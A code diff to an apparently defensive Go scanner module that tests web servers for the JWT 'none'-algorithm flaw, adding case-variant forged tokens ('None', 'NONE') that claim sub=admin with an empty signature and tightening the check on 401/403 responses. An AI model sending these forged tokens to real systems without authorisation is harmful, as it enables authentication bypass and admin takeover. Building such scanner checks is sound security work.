@@ -43,6 +43,10 @@ func (m *JWTSecurityAudit) SetThreads(count int) {
 var jwtPayloads = []string{
 	// "none" algorithm JWT (header: alg=none, payload: sub=admin, empty signature)
 	"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
+	// "None" algorithm JWT
+	"eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
+	// "NONE" algorithm JWT
+	"eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
 }
 
 func (m *JWTSecurityAudit) getBaselineStatus(ctx context.Context) int {
@@ -114,7 +118,9 @@ func (m *JWTSecurityAudit) testToken(ctx context.Context, token string, baseline
 	}
 	defer resp.Body.Close()
 
-	if resp.StatusCode == http.StatusOK && baselineStatus != http.StatusOK {
+	isBaselineAuthProtected := baselineStatus == http.StatusUnauthorized || baselineStatus == http.StatusForbidden
+
+	if isBaselineAuthProtected && resp.StatusCode != http.StatusUnauthorized && resp.StatusCode != http.StatusForbidden {
 		m.Mu.Lock()
 		m.RecordPoC(req, nil, "Server accepted JWT with 'none' algorithm")
 		m.results = append(m.results, JWTSecurityAuditResult{
